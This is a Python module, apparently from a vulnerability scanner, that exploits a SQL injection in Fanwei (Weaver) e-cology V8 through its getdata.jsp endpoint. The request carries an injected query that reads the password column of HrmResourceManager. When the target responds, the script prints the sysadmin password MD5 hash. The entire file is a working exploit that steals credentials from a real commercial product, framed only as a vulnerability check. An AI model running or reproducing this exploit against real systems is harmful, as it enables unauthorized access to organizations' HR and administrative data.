import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3


urllib3.disable_warnings()

def FanWei_sql(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    target_url = urldata + "js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        res = requests.get(url=target_url,headers=headers,verify=False,timeout=10)
        if res.status_code == 200:
            print(f"\033[31m[!]  目标系统: {url} 存在V8SQL注入！\033[0m")
            print("[-]  正在查询sysadmin密码信息.......")
            print(f"[-]  用户: sysadmin    密码MD5: \033[33m{res.text.strip()}\033[0m")
        else:
            print(Vcolors.WARNING +"[!] 不存在V8SQL注入\r" + Vcolors.ENDC)
    except Exception as e:
        print(f"[0]  目标系统: {url} 存在未知错误！\n",e)
        logging.error("FanWei_sql脚本出现异常")
  
        


